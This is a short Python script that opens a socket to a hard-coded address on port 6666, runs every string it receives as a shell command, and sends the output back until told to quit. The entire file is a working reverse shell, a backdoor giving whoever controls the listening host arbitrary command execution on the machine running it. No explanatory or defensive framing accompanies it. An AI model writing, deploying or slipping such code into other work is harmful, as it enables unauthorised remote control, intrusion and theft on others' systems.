import os
import socket
import subprocess
import sys
s = socket.socket()
host = '192.168.10.62'
port = 6666
s.connect((host, port))

while True:
    data = s.recv(1023)
    if len(data) > 0:
        if data[:].decode('utf-8') == 'quit':
            s.close()
            sys.exit()
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_string = str(output_bytes,'utf-8')
        s.send(str.encode(output_string + '> '))

# close the connection in case any error
s.close()

